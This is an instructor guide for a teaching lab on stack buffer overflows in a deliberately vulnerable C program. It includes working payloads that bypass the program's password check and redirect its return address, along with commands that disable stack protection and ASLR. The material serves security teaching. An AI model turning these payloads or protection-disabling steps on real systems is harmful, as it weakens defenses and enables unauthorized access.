# Buffer Overflow Lab - Instructor Guide

## Quick Setup for Demonstration

If you want to demonstrate this in class:

```bash
# Compile the program (simple version that works everywhere)
gcc -fno-stack-protector -o vulnerable vulnerable.c

# Normal operation
echo "hello" | ./vulnerable

# Cause overflow
python3 -c "print('A'*32)" | ./vulnerable
```

**Optional: Linux/WSL with extra flags**
```bash
gcc -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```

---

## What Students Should Observe

### Test 1: Short Input (Normal)
```
Input: "hello"
Result: "Access denied!" - Normal behavior
```

### Test 2: Buffer Overflow
```
Input: 32 A's
Result: Segmentation fault (crash)
Reason: Overwritten stack data including return address
```

### Test 3: Overwriting authenticated Variable
With the right input length (around 12-16 bytes), students might overwrite the `authenticated` variable:

```bash
# This might grant access without the correct password
python3 -c "print('A'*12 + '\x01\x00\x00\x00')" | ./vulnerable
```

The exact offset depends on compiler and system, but typically:
- 8 bytes for buffer
- Some padding/alignment
- Then the authenticated variable

---

## Common Student Questions

**Q: Why does it crash at different lengths on different systems?**
A: Memory layout can vary based on:
- Compiler version
- Optimization flags
- System architecture (32-bit vs 64-bit)
- Stack alignment

**Q: Why don't we see this in modern programs?**
A: Modern protections:
1. **Stack Canaries** - Random values placed on stack; checked before return
2. **ASLR** - Randomizes memory addresses
3. **NX Bit** - Marks stack as non-executable
4. **Compiler Warnings** - Warn about dangerous functions
5. **Safe Libraries** - Modern languages/libraries prevent this

**Q: Is gets() really that dangerous?**
A: Yes! It's been removed from C11 standard. No safe way to use it.

---

## Debugging Hints for Students

If students want to explore further:

### View Memory with GDB
```bash
gdb ./vulnerable
(gdb) break check_password
(gdb) run
(gdb) x/20x $rsp    # Examine stack
```

### Find Function Addresses
```bash
# Get address of secret_function
objdump -d vulnerable | grep secret_function
# or
nm vulnerable | grep secret_function
```

---

## Advanced Extension Activities

### Extension 1: Stack Canary Demo
Compile with stack protector enabled:
```bash
gcc -o safe vulnerable.c -Wno-deprecated-declarations
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./safe
```

Students will see: "stack smashing detected"

### Extension 2: Call secret_function()
This is challenging but possible. Students need to:
1. Find address of secret_function (use `nm` or `objdump`)
2. Calculate offset to return address (~24-32 bytes)
3. Craft payload with correct address

Example (addresses will vary):
```bash
# Find address
nm vulnerable | grep secret_function
# Output might be: 0000000000401156 T secret_function

# Craft exploit (little-endian)
python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x56\x11\x40\x00\x00\x00\x00\x00')" | ./vulnerable
```

---

## Assessment Rubric

**Basic Understanding (70%):**
- Student successfully compiles the program
- Demonstrates buffer overflow with long input
- Answers discussion questions about gets() dangers
- Explains why this is a security issue

**Intermediate (85%):**
- Experiments with different input lengths
- Identifies approximate crash point
- Discusses modern protections
- Provides example of safe code

**Advanced (100%):**
- Successfully overwrites authenticated variable
- Attempts to call secret_function()
- Discusses memory layout and stack structure
- Connects to real-world vulnerabilities

**Expert (Extra Credit - 110%):**
- Completes GDB debugging exercise
- Successfully examines memory during overflow
- Calculates exact offsets for variables and return address
- Demonstrates understanding of stack layout visually

---

## GDB Debugging Exercise (Advanced Extension)

### Overview
Students use GDB to visualize the buffer overflow in memory, seeing exactly how data corrupts the stack.

### Materials Provided
- `gdb_exercise.md` - Comprehensive step-by-step GDB tutorial
- `gdb_quick_ref.md` - Quick reference card for GDB commands
- `exploit_demo.gdb` - GDB script with helpful prompts
- `gdb_walkthrough.sh` - Automated setup and demonstration script

### Learning Objectives
Students will:
1. Set breakpoints and step through code
2. Examine variable addresses and memory contents
3. Visualize stack layout and buffer overflow
4. Calculate exact offsets for exploitation
5. Understand why debuggers are essential security tools

### Quick Instructor Demo
```bash
# Compile with debug symbols
gcc -g -fno-stack-protector -o vulnerable vulnerable.c

# Start GDB and demonstrate
gdb ./vulnerable
(gdb) break check_password
(gdb) run
# Enter: AAAAAAAABBBB
(gdb) next
(gdb) print &buffer
(gdb) print &authenticated  
(gdb) x/16xb &buffer
```

Show students how they can **see** the B's overwriting authenticated!

### Common Questions for GDB Exercise

**Q: Why do addresses change between runs?**
A: ASLR (Address Space Layout Randomization) - a security feature that randomizes memory locations. We can disable it for the lab if needed:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Q: What does 0x41414141 mean?**
A: 0x41 is ASCII for 'A'. When we see 0x41414141, that's four A's in memory!

**Q: Why is the stack "upside down"?**
A: Stack grows from high to low addresses, but we visualize it top-to-bottom for convenience.

### Tips for Teaching GDB Exercise
1. **Start simple** - Just show `print` and `x/16xb` commands first
2. **Use visuals** - Draw stack diagram on board while showing GDB output
3. **Live demo** - Walk through once, then let students explore
4. **Pair programming** - Have students work in pairs
5. **Provide scripts** - The automated demos help struggling students

---

## Troubleshooting

### Compilation errors with linker flags
- **Solution:** Use the simple version: `gcc -fno-stack-protector -o vulnerable vulnerable.c`
- The extra flags (`-z execstack`, `-no-pie`) are optional enhancements
- The main flag needed is `-fno-stack-protector`

### "gets() is dangerous" warning
- This is expected and normal!
- Part of the educational message
- Modern C standards have deprecated gets()

### Program doesn't crash with long input
- Try longer strings (50, 100 characters)
- Check compilation flags are correct
- Some systems may have additional protections

### "gets() is deprecated" warning
- This is expected and normal
- The `-Wno-deprecated-declarations` flag suppresses it
- Part of the lesson - gets() is dangerous!

### Segmentation fault immediately
- Check that the program compiled successfully
- Try shorter inputs first
- Verify WSL is working correctly

---

## Real-World Examples to Discuss

1. **Morris Worm (1988)** - One of first major internet worms, exploited buffer overflow in fingerd
2. **Code Red (2001)** - Exploited IIS web server buffer overflow
3. **SQL Slammer (2003)** - Buffer overflow in SQL Server
4. **Heartbleed (2014)** - Buffer over-read in OpenSSL
5. **Eternal Blue (2017)** - SMB buffer overflow used by WannaCry

---

## Ethical Discussion Points

- Understanding vulnerabilities makes you a better defender
- Responsible disclosure vs. exploitation
- Bug bounty programs as legitimate security research
- Legal consequences of unauthorized access
- Computer Fraud and Abuse Act (CFAA)

---

## Follow-up Topics

After this lab, you can cover:
1. SQL Injection (similar principle, different context)
2. Format String vulnerabilities
3. Integer overflows
4. Use-after-free bugs
5. Secure coding practices
